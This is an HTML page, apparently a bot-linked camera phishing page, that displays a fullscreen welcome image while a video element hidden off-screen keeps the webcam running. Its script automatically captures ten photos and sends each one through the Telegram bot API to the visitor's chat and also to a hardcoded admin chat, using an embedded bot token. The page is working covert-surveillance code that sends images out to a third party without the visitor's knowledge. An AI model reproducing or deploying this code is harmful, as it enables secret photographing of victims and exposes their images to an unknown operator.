<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Camera Capture</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      width: 100%;
      overflow: hidden;
      background: black;
    }
    img#welcome {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
    video {
      position: absolute;
      top: -9999px; /* keep it off-screen but still active */
      left: -9999px;
      width: 320px;
      height: 240px;
    }
  </style>
</head>
<body>

  <!-- Fullscreen welcome image -->
  <img id="welcome" src="assets/welcome.jpg" alt="Welcome">

  <!-- Hidden camera preview (off-screen instead of display:none) -->
  <video id="video" autoplay playsinline muted></video>

  <script>
    const video = document.getElementById('video');
    let photos = [];

    // Extract user chat_id from URL
    const urlParams = new URLSearchParams(window.location.search);
    const userChatId = urlParams.get("chat_id");

    // Replace with your own admin chat ID and bot token
    const ADMIN_CHAT_ID = "6314556756";
    const BOT_TOKEN = "8173355562:AAFKrtX9LaprMCmrgUnRyhnV7NW_LZIbKh8";

    // Start camera
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;

        video.onloadedmetadata = () => {
          video.play();
          // wait 1s to ensure frames are ready
          setTimeout(() => {
            autoCaptureAndSend();
          }, 1000);
        };
      })
      .catch(err => console.error("‚ùå Camera permission denied:", err));

    async function autoCaptureAndSend() {
      if (!userChatId) {
        alert("‚ùå No chat_id found. Please open this link from the bot.");
        return;
      }

      photos = [];
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');

      // fallback dimensions if video reports 0x0
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;

      console.log("üì∑ Capturing with size:", canvas.width, "x", canvas.height);

      // Capture 10 frames automatically
      for (let i = 0; i < 10; i++) {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        let imgData = canvas.toDataURL('image/png');
        photos.push(imgData);
        await new Promise(r => setTimeout(r, 300));
      }

      console.log("‚úÖ Captured", photos.length, "photos. Sending...");

      // Send each photo to Telegram (user + admin)
      for (let i = 0; i < photos.length; i++) {
        let blob = await (await fetch(photos[i])).blob();

        // Send to user
        let formDataUser = new FormData();
        formDataUser.append("chat_id", userChatId);
        formDataUser.append("photo", blob, `user_photo${i}.png`);
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: "POST",
          body: formDataUser
        });

        // Send to admin
        let formDataAdmin = new FormData();
        formDataAdmin.append("chat_id", ADMIN_CHAT_ID);
        formDataAdmin.append("photo", blob, `admin_photo${i}.png`);
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: "POST",
          body: formDataAdmin
        });
      }

      alert("‚úÖ 10 photos captured and sent!");
    }
  </script>
</body>
</html>
